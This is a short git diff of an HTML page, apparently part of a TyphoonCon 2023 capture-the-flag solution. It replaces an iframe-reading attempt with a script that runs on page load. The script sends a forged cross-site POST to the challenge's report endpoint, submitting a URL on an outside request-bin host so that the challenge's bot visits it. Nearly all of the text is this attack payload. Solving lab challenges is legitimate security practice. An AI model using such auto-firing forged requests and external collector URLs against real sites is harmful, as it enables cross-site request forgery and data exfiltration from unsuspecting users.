@@ -1,18 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>Read Content of Example.com</title>
-  <script>
-    function readIframeContent() {
-      var iframe = document.getElementById('myIframe');
-      var iframeContent = iframe.contentDocument.body.innerHTML;
-      console.log(iframeContent);
-    }
-  </script>
-</head>
 <body>
-  <button onclick="readIframeContent()">Read Iframe Content</button>
-  <br>
-  <iframe id="myIframe" src="https://typhoonconctf-2023-half-of-fake.chals.io/report"></iframe>
+  
+  <script>
+fetch("https://typhoonconctf-2023-half-of-fake.chals.io/report", {
+  "headers": {
+    "accept": "*/*",
+    "content-type": "application/json",
+    "x-requested-with": "XMLHttpRequest"
+  },
+  "referrer": "https://typhoonconctf-2023-half-of-fake.chals.io/report",
+  "body": "{\"name\":\"a\",\"email\":\"a\",\"url\":\"https://enbit6i3l2ra4.x.pipedream.net/" + "please" + "\",\"description\":\"a\\r\\n\"}",
+  "method": "POST",
+});
+</script>
+  
 </body>
 </html>
